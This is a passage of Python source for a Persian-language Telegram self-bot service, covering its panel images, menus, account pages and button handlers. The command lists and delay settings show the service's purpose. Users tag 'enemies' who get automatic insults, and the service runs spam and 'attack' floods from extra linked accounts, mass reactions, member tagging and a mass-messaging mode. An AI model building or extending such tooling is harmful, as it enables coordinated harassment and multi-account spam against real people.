                    res = await cl.download_profile_photo(me, file=bio)
                    raw = bio.getvalue()
                    if raw and len(raw) > 100:
                        data = raw
                        uniq = str(len(raw))
                    elif isinstance(res, str) and os.path.exists(res):
                        with open(res, 'rb') as f:
                            data = f.read()
                        uniq = str(len(data))
                        try:
                            os.unlink(res)
                        except Exception:
                            pass
                except Exception as e:
                    print("panel dl photo:", e)
                return nm, data, uniq
            nm, data, uniq = asyncio.run_coroutine_threadsafe(_fetch(), loop).result(timeout=30)
            if nm:
                name = nm
            if data:
                try:
                    avatar_im = Image.open(io.BytesIO(data)).convert('RGBA')
                    photo_unique = uniq
                except Exception as e:
                    print("panel open avatar:", e)
        except Exception as e:
            print("panel telethon:", e)
    if not avatar_im:
        try:
            photos = bot.get_user_profile_photos(uid, limit=1)
            if photos and photos.total_count > 0:
                ph = photos.photos[0][-1]
                photo_unique = getattr(ph, 'file_unique_id', None) or str(ph.file_id)[-20:]
                fi = bot.get_file(ph.file_id)
                data = bot.download_file(fi.file_path)
                avatar_im = Image.open(io.BytesIO(data)).convert('RGBA')
        except Exception as e:
            print("panel bot photo:", e)
    if not name:
        try:
            u = get_user(uid) or {}
            name = (u.get('original_name') or '').strip()
        except Exception:
            pass
    if not name:
        try:
            ch = bot.get_chat(uid)
            name = ((getattr(ch, 'first_name', None) or '') + ' ' + (getattr(ch, 'last_name', None) or '')).strip()
        except Exception:
            name = str(uid)
    try:
        set_user(uid, 'original_name', name)
    except Exception:
        pass
    fp = "v4|" + str(uid) + "|" + str(name) + "|" + str(photo_unique)
    if not force:
        cached = (get_user(uid) or {}).get('panel_img_cache') or {}
        if isinstance(cached, dict) and cached.get('fp') == fp and cached.get('file_id') and cached.get('has_overlay'):
            return cached['file_id']
    # پس‌زمینه
    try:
        fi = bot.get_file(base_fid)
        data = bot.download_file(fi.file_path)
        base = Image.open(io.BytesIO(data)).convert('RGBA')
    except Exception as e:
        print("panel base dl:", e)
        return None
    w, h = base.size
    av_size = max(100, min(int(w * 0.25), int(h * 0.35), 220))
    margin = max(18, int(w * 0.04))
    if avatar_im is None:
        avatar_im = Image.new('RGBA', (av_size, av_size), (60, 80, 120, 255))
        d0 = ImageDraw.Draw(avatar_im)
        d0.ellipse((0, 0, av_size - 1, av_size - 1), fill=(80, 110, 160, 255))
        try:
            f0 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", max(40, av_size // 2))
        except Exception:
            f0 = ImageFont.load_default()
        letter = (name[:1] if name else "?").upper()
        d0.text((av_size // 3, av_size // 5), letter, fill=(255, 255, 255, 255), font=f0)
    circle = _make_circle_avatar(avatar_im, av_size)
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", max(20, av_size // 5))
    except Exception:
        font = ImageFont.load_default()
    display_name = (name or str(uid))[:26]
    draw = ImageDraw.Draw(base)
    try:
        bbox = draw.textbbox((0, 0), display_name, font=font)
        tw, th = bbox[2] - bbox[0], bbox[3] - bbox[1]
    except Exception:
        tw, th = len(display_name) * 12, 22
    pad = max(10, av_size // 10)
    plate_w = max(av_size + pad * 2, tw + pad * 2)
    plate_h = av_size + th + pad * 3
    x0, y0 = margin, margin
    plate = Image.new('RGBA', (plate_w, plate_h), (0, 0, 0, 0))
    pd = ImageDraw.Draw(plate)
    try:
        pd.rounded_rectangle((0, 0, plate_w - 1, plate_h - 1), radius=16, fill=(0, 0, 0, 160))
    except Exception:
        pd.rectangle((0, 0, plate_w - 1, plate_h - 1), fill=(0, 0, 0, 160))
    base.paste(plate, (x0, y0), plate)
    ax = x0 + (plate_w - av_size) // 2
    ay = y0 + pad
    base.paste(circle, (ax, ay), circle)
    tx = x0 + max(0, (plate_w - tw) // 2)
    ty = ay + av_size + pad // 2
    for ox, oy in ((2, 2), (-2, 2), (2, -2), (-2, -2)):
        draw.text((tx + ox, ty + oy), display_name, font=font, fill=(0, 0, 0, 255))
    draw.text((tx, ty), display_name, font=font, fill=(255, 255, 255, 255))
    out = io.BytesIO()
    base.convert('RGB').save(out, format='JPEG', quality=93)
    out.seek(0)
    out.name = 'panel_%s.jpg' % uid
    new_fid = None
    for target in (uid, OWNER_ID):
        try:
            out.seek(0)
            msg = bot.send_photo(target, out)
            new_fid = msg.photo[-1].file_id
            try:
                bot.delete_message(target, msg.message_id)
            except Exception:
                pass
            if new_fid:
                break
        except Exception as e:
            print("panel upload to", target, e)
    if not new_fid:
        return None
    set_user(uid, 'panel_img_cache', {'fp': fp, 'file_id': new_fid, 'name': name, 'has_overlay': True})
    return new_fid


def get_user_panel_image(uid):

    """عکس پنل شخصی کاربر با پروفایل و اسم"""
    if not get_panel_image():
        return None
    try:
        fid = build_user_panel_image(uid)
        if fid:
            return fid
    except Exception as e:
        print("get_user_panel_image:", e)
    return get_panel_image()




def get_panel_title():
    t = (load_data().get('panel_title') or 'Panel SelfStr').strip()
    return t or 'Panel SelfStr'


def set_panel_title(title):
    data = load_data()
    data['panel_title'] = (title or 'Panel SelfStr').strip()[:200]
    save_data(data)


def edit_panel_message(chat_id, message_id, text, reply_markup=None, message=None):
    """ویرایش پنل روی همان پیام (عکس=کپشن، متن=متن) — روی عکس هرگز text ادیت نشود"""
    text = (text or '')[:1024]
    is_photo = False
    try:
        if message is not None and getattr(message, 'photo', None):
            is_photo = True
        elif message is not None and getattr(message, 'content_type', None) == 'photo':
            is_photo = True
        elif message is not None and getattr(message, 'caption', None) is not None and not getattr(message, 'text', None):
            is_photo = True
    except Exception:
        pass
    # اول کپشن (پیام عکس)
    try:
        bot.edit_message_caption(
            chat_id=chat_id,
            message_id=message_id,
            caption=text,
            reply_markup=reply_markup,
            parse_mode='HTML',
        )
        return True
    except Exception as e:
        err = str(e).lower()
        # اگر پیام عکس است، text ادیت نکن
        if is_photo or 'there is no text' in err or 'message is not modified' in err:
            if 'message is not modified' in err:
                try:
                    if reply_markup is not None:
                        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=reply_markup)
                        return True
                except Exception:
                    pass
            if is_photo or 'there is no text' in err:
                # فقط markup
                try:
                    if reply_markup is not None:
                        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id, reply_markup=reply_markup)
                        return True
                except Exception:
                    pass
                return False
    try:
        bot.edit_message_text(
            text, chat_id, message_id,
            reply_markup=reply_markup, parse_mode='HTML',
        )
        return True
    except Exception as e:
        if 'there is no text' in str(e).lower():
            try:
                bot.edit_message_caption(
                    chat_id=chat_id, message_id=message_id, caption=text,
                    reply_markup=reply_markup, parse_mode='HTML',
                )
                return True
            except Exception:
                return False
        return False


def send_panel_with_image(chat_id, text, reply_markup=None, message_id=None, message=None, uid=None):
    """ارسال یا ویرایش پنل با عکس — شخصی‌سازی پروفایل در صورت امکان"""
    text = (text or '')[:1024]
    fid = get_user_panel_image(uid) if uid else get_panel_image()
    if message_id:
        if edit_panel_message(chat_id, message_id, text, reply_markup, message):
            return
    if fid:
        try:
            bot.send_photo(chat_id, fid, caption=text, reply_markup=reply_markup, parse_mode='HTML')
            return
        except Exception:
            pass
    try:
        bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception:
        pass

def build_self_panel_home_mk(uid):
    mk = types.InlineKeyboardMarkup(row_width=2)
    # حساب کاربری چپ، دستورات راست
    mk.row(
        types.InlineKeyboardButton("حساب کاربری", callback_data=f"sp_acc_{uid}"),
        types.InlineKeyboardButton("دستورات", callback_data=f"sp_cmds_{uid}"),
    )
    mk.add(types.InlineKeyboardButton("بستن پنل", callback_data=f"sp_close_{uid}"))
    return mk


def build_self_panel_home_text():
    t = get_panel_title().replace("<", "").replace(">", "")
    return "<b>" + t + "</b>"


def _self_cmds_list(uid):
    items = [
        ".تنظیم دشمن", ".تنظیم دشمن ایدی", ".حذف دشمن", ".حذف دشمن ایدی",
        ".لیست دشمنان", ".پاکسازی لیست دشمنان", ".ثبت متن", ".لیست متن",
        ".پاکسازی لیست متن", ".ثبت فحش", ".لیست فحش های خودکار", ".پاکسازی لیست فحش",
        ".تنظیم متن خودکار", ".خاموش کردن فحش خودکار", ".تنظیم کل", ".حذف کل",
        ".لیست کل", ".ثبت متن کل", ".پاکسازی لیست متن کل",
        ".اسپم تعداد متن", ".اسپم متن تعداد ایدی کاراکتر",
    ]
    _ex = get_extras(uid) or {}
    if any(str(a).lower() not in ('all', 'none', '') for a in _ex.keys()):
        items += [
            ".اتک متن تعداد", ".اتک متن تعداد ایدی کاراکتر", ".set", ".leave", ".جوین",
            ".list acc", ".ری اکت ایموجی", ".ری اکت خودکار ایموجی", ".ری اکت رندوم", ".ری اکت خاموش",
        ]
    items += [
        ".ری اکت 🤣 خودکار", ".ری رندوم دقیقه تعداد", ".خاموش",
        ".تبچی خاموش", ".لیست بنر", ".گزارش", ".اولین پیام",
        ".متوقف", ".توقف", ".سکوت", ".حذف سکوت", ".لیست سکوت",
        ".تگ مدیران", ".تگ اعضا", ".تنظیم بنر دقیقه", ".بنر فعلی",
        ".محتوا", ".پاسخ", ".امار", ".امار @یوزرنیم",
        ".در حال نوشتن", ".فونت کلمه", ".انتقال عدد",
        ".@یوزرنیم‌چنل کل محتوا",
    ]
    if is_main_owner(uid):
        items += [".گزارش تعداد", ".گزارش تعداد دلیل"]
    return items


def build_self_cmds_text(uid, page=0, per=14):
    items = _self_cmds_list(uid)
    total = max(1, (len(items) + per - 1) // per)
    page = max(0, min(int(page), total - 1))
    chunk = items[page * per:(page + 1) * per]
    lines = ["<b>دستورات</b> (" + str(page + 1) + "/" + str(total) + ")"]
    for s in chunk:
        lines.append("<code>" + str(s).replace("<", "") + "</code>")
    return chr(10).join(lines)


def build_self_cmds_mk(uid, page=0, per=14):
    items = _self_cmds_list(uid)
    total = max(1, (len(items) + per - 1) // per)
    page = max(0, min(int(page), total - 1))
    mk = types.InlineKeyboardMarkup()
    nav = []
    if page < total - 1:
        nav.append(types.InlineKeyboardButton("▶ بعدی", callback_data=f"sp_cmds_{uid}_{page+1}"))
    if page > 0:
        nav.append(types.InlineKeyboardButton("قبلی ◀", callback_data=f"sp_cmds_{uid}_{page-1}"))
    if nav:
        mk.row(*nav)
    mk.add(types.InlineKeyboardButton("راهنما", callback_data=f"sp_help_{uid}"))
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"sp_home_{uid}"))
    mk.add(types.InlineKeyboardButton("بستن پنل", callback_data=f"sp_close_{uid}"))
    return mk


def build_self_help_text():
    helps = [
        (".پنل", "لیست دستورات سلف"),
        (".تنظیم دشمن", "ریپلای یا ایدی"),
        (".حذف دشمن / .لیست دشمنان", "مدیریت دشمن"),
        (".ثبت متن / .لیست متن", "متن فحش دشمن"),
        (".اتک متن تعداد", "اسپم با اکانت اضافه"),
        (".ری اکت / .ری اکت خودکار", "ری‌اکت اکانت‌ها"),
        (".set / .leave", "جوین و لفت اکانت‌ها"),
        (".امار", "آمار کاربر یا گروه"),
        (".انتقال عدد", "انتقال سکه با ریپلای"),
        (".توقف / .متوقف", "قطع عملیات"),
    ]
    parts = ["<blockquote><b>راهنما</b></blockquote>"]
    for cmd, desc in helps:
        parts.append(
            "<blockquote><code>" + str(cmd) + "</code>" + chr(10) + str(desc) + "</blockquote>"
        )
    return chr(10).join(parts)

def build_self_help_mk(uid):

    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("دستورات", callback_data=f"sp_cmds_{uid}"))
    mk.add(types.InlineKeyboardButton("بستن پنل", callback_data=f"sp_close_{uid}"))
    return mk



def build_self_acc_text(uid):
    u = get_user(uid) or {}
    coins = u.get('coins', 0)
    refs = u.get('referrals', 0)
    phone = u.get('phone') or '—'
    name = u.get('original_name') or str(uid)
    remain = ''
    try:
        remain = remaining_time(coins)
    except Exception:
        remain = '—'
    return (
        "<blockquote><b>حساب کاربری</b></blockquote>" + chr(10)
        + "<blockquote>نام: " + str(name).replace("<", "") + "</blockquote>" + chr(10)
        + "<blockquote>موجودی: <code>" + str(coins) + "</code></blockquote>" + chr(10)
        + "<blockquote>زیرمجموعه: <code>" + str(refs) + "</code></blockquote>" + chr(10)
        + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
        + "<blockquote>زمان باقی‌مانده: " + str(remain) + "</blockquote>"
    )


def build_self_acc_mk(uid):
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"sp_home_{uid}"))
    mk.add(types.InlineKeyboardButton("بستن پنل", callback_data=f"sp_close_{uid}"))
    return mk


def _edit_any(call, text, reply_markup=None, parse_mode='HTML'):
    text = (text or '')[:1024]
    # اینلاین
    if getattr(call, 'inline_message_id', None):
        try:
            bot.edit_message_caption(
                caption=text,
                inline_message_id=call.inline_message_id,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
            )
            return
        except Exception:
            pass
        try:
            bot.edit_message_text(
                text,
                inline_message_id=call.inline_message_id,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
            )
            return
        except Exception:
            pass
        return
    # پیام عادی
    try:
        chat_id = call.message.chat.id
        mid = call.message.message_id
        msg = call.message
        if edit_panel_message(chat_id, mid, text, reply_markup, msg):
            return
    except Exception:
        pass
    try:
        bot.send_message(call.from_user.id, text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception:
        pass


def personalize_panel(uid, message_id=None, chat_id=None):
    insult_d = get_ud(uid, 'insult_delay', 0)
    react_d = get_ud(uid, 'react_delay', 0)
    spam_d = get_ud(uid, 'spam_delay', 0)
    attack_d = get_ud(uid, 'attack_delay', 0)
    kol_d = get_ud(uid, 'kol_delay', 0)
    extra_spam_d = get_ud(uid, 'extra_spam_delay', 0)
    online = get_ud(uid, 'always_online', False)
    online_txt = "روشن ✅" if online else "خاموش ❌"
    clock = get_ud(uid, 'clock_enabled', False)
    clock_txt = "روشن ✅" if clock else "خاموش ❌"
    style = get_ud(uid, 'clock_style', 1)

    text = (
        "⚙️ شخصی سازی سلف\n\n"
        "ثانیه ارسال هر بخش را تنظیم کنید\n\n"
        f"فحش به دشمن : {insult_d} ثانیه | بعد ارسال پیام دشمن فحش بهش ارسال میشه\n"
        f"ری اکت : {react_d} ثانیه | بعد از ارسال پیام طرف ری‌اکت زده میشه\n"
        f"اسپم : {spam_d} ثانیه | بعد هر ارسال پیام صبر میکنیم و بعدش پیام بعدی\n"
        f"فحش خودکار : {attack_d} ثانیه | فاصله بین ارسال فحش‌های خودکار\n"
        f"کل : {kol_d} ثانیه | بعد از پیام طرف به آخرین پیامش ریپلای میشه\n"
        f"اسپم اکانت اضافه : {extra_spam_d} ثانیه | صبر بین هر پیام اسپم اک‌های اضافه\n\n"
        f"حالت همیشه آنلاین: {online_txt}\n"
        f"ساعت کنار اسم: {clock_txt} | استایل: {style}"
    )

    mk = types.InlineKeyboardMarkup(row_width=3)
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_ins_m_{uid}"),
        types.InlineKeyboardButton("فحش به دشمن", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_ins_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_rea_m_{uid}"),
        types.InlineKeyboardButton("ری اکت", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_rea_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_spa_m_{uid}"),
        types.InlineKeyboardButton("اسپم", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_spa_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_atk_m_{uid}"),
        types.InlineKeyboardButton("فحش خودکار", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_atk_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_kol_m_{uid}"),
        types.InlineKeyboardButton("کل", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_kol_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("▬", callback_data=f"d_esp_m_{uid}"),
        types.InlineKeyboardButton("اسپم اکانت اضافه", callback_data="noop"),
        types.InlineKeyboardButton("✚", callback_data=f"d_esp_p_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("🟢 همیشه آنلاین روشن", callback_data=f"online_on_{uid}"),
        types.InlineKeyboardButton("🔴 همیشه آنلاین خاموش", callback_data=f"online_off_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("🕒 ساعت روشن", callback_data=f"clock_on_{uid}"),
        types.InlineKeyboardButton("🕒 ساعت خاموش", callback_data=f"clock_off_{uid}")
    )
    mk.add(types.InlineKeyboardButton("🎨 استایل های فونت", callback_data=f"cstyles_{uid}"))
    mk.add(types.InlineKeyboardButton("📝 استایل متن", callback_data=f"tstyles_{uid}"))
    keep = get_ud(uid, 'keep_messages', False)
    keep_txt = "🗃 حذف‌نشدن پیام‌ها: روشن" if keep else "🗃 حذف‌نشدن پیام‌ها: خاموش"
    mk.add(types.InlineKeyboardButton(keep_txt, callback_data=f"keep_toggle_{uid}"))
    join_txt = get_ud(uid, 'extra_join_text', None) or "Server : on"
    mk.add(types.InlineKeyboardButton("متن جوین اکانت‌ها", callback_data=f"ex_join_txt_{uid}"))
    mk.add(types.InlineKeyboardButton("پروفایل اکانت‌های اضافه", callback_data=f"ex_prof_{uid}"))
    try:
        text = text + "\n\nمتن جوین اکانت‌ها: " + str(join_txt)[:40]
    except Exception:
        pass
    mk.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data=f"back_{uid}"))

    if message_id and chat_id:
        try:
            if edit_panel_message(chat_id, message_id, text, mk):
                remember_panel(uid, message_id)
                return
        except Exception:
            pass
        try:
            bot.edit_message_caption(chat_id=chat_id, message_id=message_id, caption=(text or '')[:1024], reply_markup=mk, parse_mode='HTML')
            remember_panel(uid, message_id)
            return
        except Exception:
            pass
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=mk, parse_mode='HTML')
            remember_panel(uid, message_id)
            return
        except Exception:
            pass
    try:
        del_old_panel(uid)
    except Exception:
        pass
    img = None
    try:
        img = get_user_panel_image(uid) or get_panel_image()
    except Exception:
        try:
            img = get_panel_image()
        except Exception:
            img = None
    try:
        if img:
            msg = bot.send_photo(uid, img, caption=(text or '')[:1024], reply_markup=mk, parse_mode='HTML')
        else:
            msg = bot.send_message(uid, text, reply_markup=mk, parse_mode='HTML')
        remember_panel(uid, msg.message_id)
    except Exception:
        try:
            msg = bot.send_message(uid, text, reply_markup=mk)
            remember_panel(uid, msg.message_id)
        except Exception:
            pass

def main_panel(uid, message_id=None, chat_id=None):
    try:
        del_old_panel(uid, keep_mid=message_id)
    except Exception:
        pass
    if get_ud(uid, 'banned') and int(uid) != int(OWNER_ID):
        try:
            bot.send_message(uid, ban_user_message(uid))
        except Exception:
            pass
        return

    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("👤 حساب کاربری", callback_data=f"acc_{uid}"),
        types.InlineKeyboardButton("👥 زیرمجموعه", callback_data=f"ref_{uid}")
    )
    mk.add(
        types.InlineKeyboardButton("⚙️ مدیریت سلف", callback_data=f"manage_{uid}"),
        types.InlineKeyboardButton("🎨 شخصی‌سازی", callback_data=f"personalize_{uid}")
    )
    try:
        mk.add(types.InlineKeyboardButton("🛒 خرید اشتراک", url=_support_url()))
    except Exception:
        mk.add(types.InlineKeyboardButton("🛒 خرید اشتراک", callback_data=f"buy_sub_{uid}"))
    mk.add(types.InlineKeyboardButton("📱 مدیریت اک ها", callback_data=f"ex_menu_{uid}"))
    if is_reporter_user(uid):
        mk.add(types.InlineKeyboardButton("📡 ریپورتر", callback_data=f"reporter_{uid}"))
    # پشتیبانی = مستقیم پیوی مالک (دکمه url)
    support_url = "tg://user?id=" + str(OWNER_ID)
    try:
        ch = bot.get_chat(OWNER_ID)
        un = getattr(ch, 'username', None)
        if un:
            support_url = "https://t.me/" + str(un)
    except Exception:
        pass
    mk.add(
        types.InlineKeyboardButton("🔗 اتصال اکانت", callback_data=f"connect_{uid}"),
        types.InlineKeyboardButton("💬 پشتیبانی", url=support_url),
    )
    if is_main_owner(uid) or get_ud(uid, 'tabchi_admin'):
        mk.add(types.InlineKeyboardButton("تبچی", callback_data=f"otabchi_{uid}"))
    if is_owner(uid):
        mk.add(types.InlineKeyboardButton("👑 پنل مالک", callback_data=f"owner_{uid}"))
    elif is_admin(uid):
        mk.add(types.InlineKeyboardButton("🛡 پنل ادمین", callback_data=f"admin_{uid}"))
    body = "<b>" + get_panel_title().replace("<", "") + "</b>"
    if not has_session(uid):
        body = "<b>" + get_panel_title().replace("<", "") + "</b>" + chr(10) + "(هنوز لاگین نکردی — اتصال اکانت را بزن)"
    body = body[:1024]
    if message_id and chat_id:
        if edit_panel_message(chat_id, message_id, body, mk):
            remember_panel(uid, message_id)
            return
    try:
        fid = get_user_panel_image(uid)
        if fid:
            msg = bot.send_photo(uid, fid, caption=body, reply_markup=mk, parse_mode='HTML')
        else:
            msg = bot.send_message(uid, body, reply_markup=mk, parse_mode='HTML')
        remember_panel(uid, msg.message_id)
    except Exception as e:
        try:
            print("main_panel error:", e)
        except Exception:
            pass

def admin_panel_edit(uid, text, reply_markup=None):
    """ویرایش پیام پنل ذخیره‌شده در admin_states (بدون پیام جدید)"""
    st = admin_states.get(uid) or {}
    mid = st.get('panel_mid')
    cid = st.get('panel_chat') or uid
    if mid and cid:
        try:
            if edit_panel_message(cid, mid, text, reply_markup):
                return True
        except Exception:
            pass
    try:
        bot.send_message(uid, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception:
        pass
    return False


def _safe_edit(call, text, reply_markup=None, parse_mode=None):
    """ادیت امن روی همان پیام (عکس یا متن)"""
    uid = call.from_user.id
    parse_mode = parse_mode or 'HTML'
    text = (text or '')[:1024]
    kw = {'parse_mode': parse_mode}
    if reply_markup is not None:
        kw['reply_markup'] = reply_markup
    try:
        if getattr(call, 'inline_message_id', None):
            try:
                bot.edit_message_caption(caption=text, inline_message_id=call.inline_message_id, **kw)
                return True
            except Exception:
                pass
            try:
                bot.edit_message_text(text, inline_message_id=call.inline_message_id, **kw)
                return True
            except Exception:
                pass
    except Exception:
        pass
    chat_id = None
    mid = None
    msg = None
    try:
        if call.message:
            chat_id = call.message.chat.id
            mid = call.message.message_id
            msg = call.message
    except Exception:
        pass
    if chat_id and mid:
        try:
            if edit_panel_message(chat_id, mid, text, reply_markup, msg):
                return True
        except Exception:
            pass
        # اگر عکس بود و ادیت نشد، همان پیام را با عکس جدید نفرست — فقط تلاش markup
        try:
            if msg is not None and getattr(msg, 'photo', None):
                bot.edit_message_caption(
                    chat_id=chat_id, message_id=mid, caption=text,
                    reply_markup=reply_markup, parse_mode=parse_mode,
                )
                return True
        except Exception:
            pass
    try:
        bot.send_message(uid, text, **kw)
        return True
    except Exception:
        return False


def _ans(call, text=None, alert=False):
    try:
        if text:
            bot.answer_callback_query(call.id, str(text)[:180], show_alert=bool(alert))
        else:
            bot.answer_callback_query(call.id)
    except Exception:
        pass



@bot.inline_handler(lambda q: True)
def inline_self_panel(query):
    try:
        uid = query.from_user.id
        q = (query.query or '').strip()
        # فقط پنل خود کاربر
        if q.startswith('panel_'):
            try:
                want = int(q.split('_', 1)[1])
            except Exception:
                want = uid
            if want != uid and not is_main_owner(uid):
                bot.answer_inline_query(query.id, [], cache_time=1, is_personal=True)
                return
        mk = build_self_panel_home_mk(uid)
        text = build_self_panel_home_text()
        fid = get_user_panel_image(uid)
        if fid:
            r = types.InlineQueryResultCachedPhoto(
                id='panel1',
                photo_file_id=fid,
                title='Panel Selfstr',
                description='پنل سلف',
                caption=text[:1024],
                parse_mode='HTML',
                reply_markup=mk,
            )
        else:
            r = types.InlineQueryResultArticle(
                id='panel1',
                title='Panel Selfstr',
                description='پنل سلف',
                input_message_content=types.InputTextMessageContent(
                    text,
                    parse_mode='HTML',
                ),
                reply_markup=mk,
            )
        bot.answer_inline_query(query.id, [r], cache_time=1, is_personal=True)
    except Exception:
        try:
            bot.answer_inline_query(query.id, [], cache_time=1, is_personal=True)
        except Exception:
            pass


@bot.callback_query_handler(func=lambda c: True)
def cb(call):
    """هندلر اصلی دکمه‌ها — همیشه جواب می‌دهد"""
    uid = None
    data = ""
    try:
        _uid = call.from_user.id
        import time as _tcb
        now = _tcb.time()
        prev = last_cb_time.get(_uid, 0)
        if now - prev < 0.35:
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
            return
        last_cb_time[_uid] = now
    except Exception:
        pass
    try:
        uid = call.from_user.id
        data = call.data or ""
    except Exception:
        return

    # پاسخ فوری به callback تا خطای query is too old ندهد
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    try:
        if data == "noop":
            return

        # اتصال اکانت — اگر لاگین است فقط توست
        if data.startswith('connect_') and has_session(uid):
            _ans(call, "قبلا متصل شدی", alert=True)
            return

        # همیشه اول به تلگرام جواب بده تا لودینگ نماند
        _ans(call)

        if is_user_banned(uid):
            try:
                bot.answer_callback_query(call.id)
            except Exception:
                pass
            return

        # عضویت اجباری — هر دکمه
        if not data.startswith('ch_ok_') and not data.startswith('fch_') and data not in ('oforce', 'aforce', 'noop'):
            try:
                if require_channel_join(uid):
                    return
            except Exception:
                pass

        # ----- دکمه‌های اصلی -----
        if data.startswith('back_'):
            try:
                mid = call.message.message_id if call.message else None
                cid = call.message.chat.id if call.message else None
                main_panel(uid, mid, cid)
            except Exception:
                main_panel(uid)
            return

        if data.startswith('acc_'):
            u = get_user(uid)
            coins = u.get('coins', 0)
            refs = u.get('referrals', 0)
            phone = u.get('phone') or 'ثبت نشده'
            name = u.get('original_name') or getattr(call.from_user, 'first_name', None) or str(uid)
            lines = [
                "نام: " + str(name),
                "موجودی: `" + str(coins) + "`",
                "زیرمجموعه: `" + str(refs) + "`",
                "ایدی عددی: `" + str(uid) + "`",
                "شماره اکانت:",
                "`" + str(phone) + "`",
                "",
                "اکانت های اضافه:",
            ]
            extras = get_extras(uid) or {}
            if not extras:
                lines.append("ندارد")
            else:
                for aid, info in extras.items():
                    if not isinstance(info, dict):
                        continue
                    if str(aid).lower() in ('all', 'none', ''):
                        continue
                    eph = info.get('phone') or "—"
                    enm = info.get('name') or ""
                    eun = info.get('username')
                    eid = info.get('id') or aid
                    lines.append("`" + str(eph) + "`")
                    extra_line = str(eid)
                    if eun:
                        extra_line += " @" + str(eun)
                    if enm:
                        extra_line += " " + str(enm)
                    lines.append(extra_line)
            try:
                lines.append("")
                lines.append("زمان باقی‌مانده: " + remaining_time(coins))
            except Exception:
                pass
            t = "\n".join(lines)
            mk = types.InlineKeyboardMarkup()
            mk.row(
                types.InlineKeyboardButton(str(coins), callback_data='noop'),
                types.InlineKeyboardButton('موجودی', callback_data='noop'),
            )
            mk.add(types.InlineKeyboardButton('انتقال موجودی', callback_data=f'pv_xfer_{uid}'))
            mk.add(types.InlineKeyboardButton('افزودن موجودی', callback_data=f'buy_sub_{uid}'))
            mk.add(types.InlineKeyboardButton('بازگشت', callback_data=f'back_{uid}'))
            t_html = (
                "<blockquote><b>حساب کاربری</b></blockquote>" + chr(10)
                + "<blockquote>نام: " + str(name).replace("<", "") + "</blockquote>" + chr(10)
                + "<blockquote>موجودی: <code>" + str(coins) + "</code></blockquote>" + chr(10)
                + "<blockquote>زیرمجموعه: <code>" + str(refs) + "</code></blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
                + "<blockquote>شماره: <code>" + str(phone).replace("<", "") + "</code></blockquote>"
            )
            try:
                t_html += chr(10) + "<blockquote>زمان باقی‌مانده: " + str(remaining_time(coins)) + "</blockquote>"
            except Exception:
                pass
            _safe_edit(call, t_html, mk, parse_mode='HTML')
            return

        if data.startswith('ref_'):
            try:
                un = bot.get_me().username
            except Exception:
                un = None
            link = ("https://t.me/" + str(un) + "?start=ref_" + str(uid)) if un else ("ref_" + str(uid))
            refs = get_ud(uid, 'referrals', 0)
            t = (
                "<blockquote><b>لینک زیرمجموعه‌گیری شما</b></blockquote>" + chr(10)
                + "<blockquote><code>" + link + "</code></blockquote>" + chr(10)
                + "<blockquote><b>هر زیرمجموعه ۱۰۰ سکه</b></blockquote>" + chr(10)
                + "<blockquote><b>تعداد:</b> <code>" + str(refs) + "</code></blockquote>"
            )
            mk = types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}")
            )
            _safe_edit(call, t, mk, parse_mode='HTML')
            return


        if data.startswith('manage_'):
            enabled = bool(get_ud(uid, 'self_enabled', True))
            st = "روشن" if enabled else "خاموش"
            btn = "سلف روشن" if enabled else "سلف خاموش"
            mk = types.InlineKeyboardMarkup(row_width=1)
            mk.add(types.InlineKeyboardButton(btn, callback_data=f"toggle_self_{uid}"))
            mk.add(types.InlineKeyboardButton("بازگشت", callback_data=f"back_{uid}"))
            body = (
                "<blockquote>مدیریت سلف</blockquote>" + chr(10)
                + "<blockquote>وضعیت فعلی : <b>" + st + "</b></blockquote>"
            )
            _safe_edit(call, body, mk, parse_mode='HTML')
            return

        if data.startswith('toggle_self_'):
            try:
                target = int(data.split('_')[-1])
            except Exception:
                target = uid
            if target != uid:
                return
            enabled = bool(get_ud(uid, 'self_enabled', True))
            if enabled:
                set_user(uid, 'self_enabled', False)
                spam_cancel[uid] = True
                delete_jobs[uid] = False
                try:
                    interval_jobs.pop(uid, None)
                except Exception:
                    pass
                btn = "سلف خاموش"
            else:
                if get_ud(uid, 'coins', 0) <= 0:
                    bot.send_message(uid, "سکه ندارید")
                    return
                set_user(uid, 'self_enabled', True)
                spam_cancel[uid] = False
                if uid not in clients or not clients[uid].is_connected():
